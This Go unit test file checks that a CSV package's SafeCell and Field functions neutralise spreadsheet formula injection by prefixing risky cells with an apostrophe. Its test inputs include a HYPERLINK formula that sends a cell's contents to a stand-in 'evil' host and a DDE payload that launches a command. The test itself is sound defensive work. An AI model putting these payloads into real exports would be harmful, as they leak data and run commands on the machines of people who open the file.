package csv

import "testing"

func TestSafeCell(t *testing.T) {
	cases := map[string]string{
		`=HYPERLINK("http://evil/?"&A2,"x")`: `'=HYPERLINK("http://evil/?"&A2,"x")`,
		"+1+1":                               "'+1+1",
		"-2+3":                               "'-2+3",
		"@SUM(A1)":                           "'@SUM(A1)",
		"\tcmd":                              "'\tcmd",
		"\rcmd":                              "'\rcmd",
		"Alice":                              "Alice",
		"":                                   "",
		"a=b":                                "a=b",
	}
	for in, want := range cases {
		if got := SafeCell(in); got != want {
			t.Errorf("SafeCell(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestField(t *testing.T) {
	if got := Field(`=cmd|' /C calc'!A0`); got != `'=cmd|' /C calc'!A0` {
		t.Errorf("got %q", got)
	}
	if got := Field(`Smith, "Bob"`); got != `"Smith, ""Bob"""` {
		t.Errorf("got %q", got)
	}
}
